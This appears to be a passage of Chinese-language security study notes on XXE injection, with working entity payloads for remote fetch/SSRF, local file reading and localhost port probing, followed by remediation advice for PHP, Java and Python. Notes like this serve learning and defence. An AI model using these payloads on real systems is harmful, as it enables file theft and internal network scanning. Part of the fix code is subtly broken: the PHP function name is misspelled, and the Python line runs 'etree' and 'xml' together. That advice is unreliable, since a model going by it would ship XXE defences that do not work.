## 10. XXE
#XXE
XML的实体注入，进行ssrf、读取文件、执行命令、扫描端口

```xml
<!DOCTYPE aaa[
<!ENTITY a SYSTEM "http://test.com/temp.txt">
]>
&a;
<!DOCTYPE aaa[
<!ENTITY b SYSTEM "file:///D:/t.txt">
]>
&b;
<!DOCTYPE aaa[
<!ENTITY c SYSTEM "http://127.0.0.1:8080">
]>
&c;
<!--存在是HTTP request failed；不存在是connection failed>
```

修补XXE

1.   使用开发语言提供的禁用外部实体的方法

     PHP: libxml_disable_entry_loader(true);

     JAVA: DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);

     Python: from lxml import etreexml 

     ​	Data = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))

2.   过滤用户提交的XML数据关键词：<!DOCTYPE 和 <!ENTITY 或者 SYSTEM 和 PUBLIC

3.   libxml 2.9.1之后默认不解析外部实体